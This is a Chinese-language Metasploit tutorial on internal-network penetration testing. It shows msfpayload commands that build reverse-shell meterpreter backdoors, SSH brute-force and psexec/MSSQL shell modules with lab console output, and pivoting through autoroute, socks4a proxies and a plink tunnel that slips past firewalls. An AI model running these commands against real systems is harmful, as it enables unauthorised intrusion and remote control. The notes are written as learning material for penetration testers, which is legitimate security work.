# metasploit渗透测试笔记(内网渗透篇)

0x01 reverse the shell
----------------------

* * *

### File

通常做法是使用msfpayload生成一个backdoor.exe然后上传到目标机器执行。本地监听即可获得meterpreter shell。

```
reverse_tcp/http/https => exe => victim => shell

```

**reverse_tcp**

windows:

```
msfpayload windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> X > shell.exe

```

![enter image description here](http://drops.javaweb.org/uploads/images/f02f5dd3e3461d9ab734e32dd46cb0acc1682428.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/c47834b60bc073ce0fc98a127de7fb926a1c6090.jpg)

Linux(x86)

```
msfpayload linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -t elf -o shell

```

![enter image description here](http://drops.javaweb.org/uploads/images/c6da8a5a4287bf9aedbbf09eb4c9ee3a3670f269.jpg)

**reverse_http**

```
msfpayload windows/meterpreter/reverse_http LHOST=<Your IP Address> LPORT=<Your Port to Connect On> X > shell.exe

```

![enter image description here](http://drops.javaweb.org/uploads/images/eba5fb48cb4c97bc80149b055516d06ebdc817e6.jpg)

**reverse_https**

```
msfpayload windows/meterpreter/reverse_https LHOST=<Your IP Address> LPORT=<Your Port to Connect On> X > shell.exe

```

![enter image description here](http://drops.javaweb.org/uploads/images/6940d46da911c2d6d3ec9d6250f9328820c7a0ce.jpg)

### Login privilege

在获得一些登陆权限之后获得meterpreter shell的方法。

**SSH**

**ssh_login**

模块路径:`auxiliary/scanner/ssh/ssh_login`

```
msf exploit(sshexec) > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > show options 

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   true             no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      true             no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf auxiliary(ssh_login) > set RHOSTS 192.168.1.104
RHOSTS => 192.168.1.104
msf auxiliary(ssh_login) > set USERNAME root
USERNAME => root
msf auxiliary(ssh_login) > set PASS
set PASSWORD   set PASS_FILE  
msf auxiliary(ssh_login) > set PASSWORD toor
PASSWORD => toor
msf auxiliary(ssh_login) > exploit 

[*] 192.168.1.104:22 SSH - Starting bruteforce
[*] 192.168.1.104:22 SSH - [1/3] - Trying: username: 'root' with password: ''
[-] 192.168.1.104:22 SSH - [1/3] - Failed: 'root':''
[*] 192.168.1.104:22 SSH - [2/3] - Trying: username: 'root' with password: 'root'
[-] 192.168.1.104:22 SSH - [2/3] - Failed: 'root':'root'
[*] 192.168.1.104:22 SSH - [3/3] - Trying: username: 'root' with password: 'toor'
[*] Command shell session 4 opened (192.168.1.105:54562 -> 192.168.1.104:22) at 2014-08-07 22:55:54 +0800
[+] 192.168.1.104:22 SSH - [3/3] - Success: 'root':'toor' 'uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=system_u:system_r:unconfined_t:SystemLow-SystemHigh Linux localhost.localdomain 2.6.18-164.el5 #1 SMP Thu Sep 3 03:33:56 EDT 2009 i686 i686 i386 GNU/Linux '
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) > sessions 

Active sessions
===============

  Id  Type         Information                       Connection
  --  ----         -----------                       ----------
  4   shell linux  SSH root:toor (192.168.1.104:22)  192.168.1.105:54562 -> 192.168.1.104:22 (192.168.1.104)

msf auxiliary(ssh_login) >

```

![enter image description here](http://drops.javaweb.org/uploads/images/b43567d8fee054170a960165d37ff02843cb3101.jpg)

这里metasploit在探测ssh弱口令时，如果发现存在，则会返回一个linux shell，注意此时不是meterpreter shell。接下来可以使用

```
sessions –u id

```

将linux shell升级为meterpreter shell，本地测试失败了。:(

**sshexec**

模块路径:`auxiliary/scanner/ssh/ssh_login`

注意这个模块BT5下是没有的，kali中则存在。

```
msf> use exploit/multi/ssh/sshexec 
msf exploit(sshexec) > set payload linux/x86/meterpreter/reverse_tcp 
payload => linux/x86/meterpreter/reverse_tcp
msf exploit(sshexec) > set LHOST 192.168.1.105 
LHOST => 192.168.1.105
msf exploit(sshexec) > set LPORT 8080
LPORT => 8080
msf exploit(sshexec) > set RHOST 192.168.1.104
RHOST => 192.168.1.104
msf exploit(sshexec) > set PASSWORD toor
PASSWORD => toor
msf exploit(sshexec) > exploit 

[*] Started reverse handler on 192.168.1.105:8080 
[*] 192.168.1.104:22 - Sending Bourne stager...
[*] Command Stager progress -  40.39% done (288/713 bytes)
[*] Transmitting intermediate stager for over-sized stage...(100 bytes)
[*] Sending stage (1228800 bytes) to 192.168.1.104
[*] Command Stager progress - 100.00% done (713/713 bytes)
[*] Meterpreter session 3 opened (192.168.1.105:8080 -> 192.168.1.104:40813) at 2014-08-07 22:53:12 +0800

meterpreter > 

```

![enter image description here](http://drops.javaweb.org/uploads/images/d9ef71641b46db5b5cf46b9702c5b0e33df60771.jpg)

**smb**

模块路径:`exploit/windows/smb/psexec`

当使用smb_login扫出windows的弱口令时，可以尝试使用这种方法获取shell。 这是在内网中获得windows shell最基本的方法，在登陆域机器时需要设置Domain参数，否则登陆错误。

正如之前提到的show advanced，每个模块都有高级参数设定，这里的psexec就可以设置advanced中的EXE参数达到执行攻击者本地任意文件的目的(见参考<1>)。

![enter image description here](http://drops.javaweb.org/uploads/images/14bfd6eae27b93fdf61c5a3ce8d76caa3065f2cc.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/82f4f3e261de8b42513908e0a1eea3e56404fd2d.jpg)

如果目标机器有杀软或者其他简单的防护措施呢？ 那么可以尝试只执行命令

**psexec_command**

模块路径:`auxiliary/admin/smb/psexec_command`

![enter image description here](http://drops.javaweb.org/uploads/images/b708a049e2b4f225f95c16fe1da37cd2e4400b29.jpg)

这里需要注意的是psexec.exe(pstools中的工具)如果不能成功执行，那么psexec_command或许是可以执行的，并且大多数的情况下metasploit中的psexec都可以用，而psexec.exe则不能用 :(

**sqlserver**

```
msf exploit(psexec) > use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) > show options 

Module options (exploit/windows/mssql/mssql_payload):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   METHOD               cmd              yes       Which payload delivery method to use (ps, cmd, or old)
   PASSWORD                              no        The password for the specified username
   RHOST                                 yes       The target address
   RPORT                1433             yes       The target port
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(mssql_payload) >

```

![enter image description here](http://drops.javaweb.org/uploads/images/ad740a041db868e039ffc681c4a01cea4bfc4e1e.jpg)

在获得sql server的登陆权限后同样可以快速的获得meterpreter shell。

注意这里METHOD选项，三种方法都要使用XP_cmdshell，而第一种ps是使用powershell，第二种需要使用wscript.exe，第三种则要用到debug.com。 本地没有环境，就不截图演示了

**others**

不管是什么场景，只要能转换成文件上传和执行权限就可以得到shell。在获得一种权限时当然可以先google一番是否有可适用的脚本，如果没有再分析是否能转换为文件操作和执行权限。如果可以那就可以得到shell了。 比如:

```
mysql and sqlserver ..etc => file/webshell =>shell

```

本地同样也测试了下tunna里自带的msf插件，测试了php版的。代码大致是这样的

![enter image description here](http://drops.javaweb.org/uploads/images/1744b66cb770a6cdbb4570c9248d326007e235ad.jpg)

先本地生成一个meterpreter.exe(文件名不随机),

然后上传到`c:\windows\temp\meterpreter.exe`。

再通过php的exec函数执行。测试的时候发现代码生成meterpreter.exe时LHOST参数有误，改了rb代码之后终于在错误中弹回。

0x02 pivot with metasploit
--------------------------

* * *

在获取到跳板机一定权限后，如何充分发挥跳板功能呢？这部分内容将简单的介绍几种常见的方法。

### 添加路由表

![enter image description here](http://drops.javaweb.org/uploads/images/fd57fd846cbace8f5949140cc24bea139fe87565.jpg)

这是在metasploit中最常用的方法，在添加路由表和session的关系后，便可以使用msf中的模块跨网段扫描或攻击。方法有很多，这里有个脚本autoroute可以快速添加路由表(如上图)，也可以将当前session置于后台(backgroud)，然后用route命令添加。

### Socks4a代理

这里使用`auxiliary/server/socks4a`模块，需要注意Proxychains不支持ICMP，所以在代理使用NMAP的时候需要使用 –sT`-Pn`参数。另外Proxychains的连接提示很乱，用kali自带的Proxychains代理使用sqlmap的时候看起来真的特别乱。在这里可以使用proxychains-ng。 先在kali中卸载proxychains,然后再安装proxychains-ng。

![enter image description here](http://drops.javaweb.org/uploads/images/ed7b6e477c6c92716b72d92f77dee941a23274d7.jpg)

```
root@kali:~# git clone https://github.com/rofl0r/proxychains-ng.git
正克隆到 'proxychains-ng'...
remote: Counting objects: 842, done.
remote: Total 842 (delta 0), reused 0 (delta 0)
Receiving objects: 100% (842/842), 465.92 KiB | 27 KiB/s, done.
Resolving deltas: 100% (554/554), done.
root@kali:~# cd proxychains-ng/
root@kali:~/proxychains-ng#  ./configure --prefix=/usr --sysconfdir=/etc
Done, now run make && make install
root@kali:~/proxychains-ng# make && make install

```

之后使用proxychains4`-q`选项运行，然后就不会有杂乱混杂的输出了。

### ssh

**meta_ssh**

当有一个ssh登录权限后,可以使用这个插件在ssh会话基础上建立链接(见参考<2>)。

![enter image description here](http://drops.javaweb.org/uploads/images/25d26507b9c7008062060fb365bccb374218b870.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/eb9e59e4aee2dd4bb3ab514e00a1c4e02fb1e410.jpg)

之后进入shell，查看网卡IP信息，然后退出再添加路由表。

![enter image description here](http://drops.javaweb.org/uploads/images/f8b7546d87070d852692239e3b432c140a7ae5c6.jpg)

再尝试扫描5.5.5.0/24这个段，然后对这个段中的5.5.5.134进行弱口令扫描。

![enter image description here](http://drops.javaweb.org/uploads/images/5d126fa6155e3877ad6279ff61ed76de9280e0aa.jpg)

发现可以获得结果。

**ssh/plink.exe**

还有一种利用SSH的方式就在windows下使用plink反弹,这样数据包经过SSH加密后，便可以躲过防火墙的检测。同理在linux也是一样的。 首先生成反弹到本地的reverse后门。

```
msfpayload windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=5566 >  ~/Desktop/backdoor_reverse_localhost.exe

```

![enter image description here](http://drops.javaweb.org/uploads/images/6a98ea8e4eccb172dc75c74682ca54e336cd5565.jpg)

然后开启本地监听，再将plink和backdoor.exe通过webshell上传。然后执行

```
echo y | plink.exe -L 5566:192.168.6.131:6666 192.168.6.131 -l root -pw toor

```

之后运行backdoor.exe，meterpreter就通过ssh tunnel建立起来了。

![enter image description here](http://drops.javaweb.org/uploads/images/6a609174bf204a2777aa9d5334a9c4ecb0b4b607.jpg)

0x03 内网扫描
---------

* * *

Metasploit对于常见服务(`smb/ssh/mysql/mssql/oracle/ftp/tfp/ …etc`)扫描可以做到版本信息(`banner`)、登录验证等。

简单过程可以参考之前的笔记《msf内网渗透小记》

具体扫描的脚本路径在`/usr/share/metasploit-framework/modules/auxiliary/scanner`下，可以根据需求自行发现。

常见的扫描端口:`7,21,22,23,25,43,50,53,67,68,79,80,109,110,111,123,135,137,138,139,143,161,264,265,389,443,445,500,631,901,995,1241,1352,1433,1434,1521,1720,1723,3306,3389,3780,4662,5800,5801,5802,5803,5900,5901,5902,5903,6000,6666,8000,8080,8443,10000,10043,27374,27665`

当然也可以使用rc脚本(`basic_discovery.rc`)。

另外内网里还有一处信息的搜集就是**snmp**,如果有交换机存在snmp弱口令(团体字符串),那么便可以通过snmp收集路由表信息和VLAN划分信息等。

一般网络都会在vlan划分时备注信息，比如Vlan100是x部门,Vlan200是y部门等等。 不同品牌、型号的交换机在获取这一信息时所需要的OID可能不同(大部分不一样)，而snmp又是在udp的161端口，在交换机没有开放ssh、telnet、web时\或者开放以上服务，端口又未能做转发时，则可以在知道具体的OID值后通过改写snmp_enumusers.rb脚本实现。

![enter image description here](http://drops.javaweb.org/uploads/images/a7c7ec4a1d89c159532243e52599189fee3e7fef.jpg)

0x04 域渗透相关
----------

* * *

推荐几个AD下渗透的扫描脚本(见参考<3>,下同)

**psexec_Loggedin_users**

![enter image description here](http://drops.javaweb.org/uploads/images/aa2e056cbd22212a965cae6602fa72df6096895a.jpg)

这个脚本可以找到当前段每个IP所登录的用户。

**local_admin_search_enum**

![enter image description here](http://drops.javaweb.org/uploads/images/5263249a57d3a5086308c5813a1a3703b2c2fafe.jpg)

这个可以找到当前登录管理账户的IP和用户名。

**psexec_scanner**

![enter image description here](http://drops.javaweb.org/uploads/images/ddde48b5e9c4989bc7ce98c02653868c5eb8c7c6.jpg)

批量执行psexec获得shell,脚本里有个psexec的函数，绝对是改写的好范本。见参考<4>

更多metasploit关于windows域渗透的脚本见参考<5>

0x05 后记
-------

* * *

关于内网及域下渗透并不一定需要metasploit，更多的是与其他工具的配合。而且这一过程思路(见参考<6>)和对AD的理解明显比会用工具重要。metasploit只是提供了一个自动化发现利用的tunnel，如果简单理解ruby及metasploit代码框架，无论是学习还是渗透测试，都将会是一个有力的辅助。另外上文中的示例只是为读者所遇情况而构建脚本时的参考。

0x06 参考
-------

* * *

<1> http://opexxx.tumblr.com/post/35763770674/btb-security-how-to-make-custom-exes-for-deployment

<2> https://github.com/dirtyfilthy/metassh

<3> http://www.pentestgeek.com/2012/11/03/find-local-admin-with-metasploit/

<4> http://www.darkoperator.com/blog/2011/12/16/psexec-scanner-auxiliary-module.html

<5> https://github.com/darkoperator/Meterpreter-Scripts/tree/master/post/windows/gather

<6> http://www.freebuf.com/articles/web/5901.html (及8楼Gall的回复)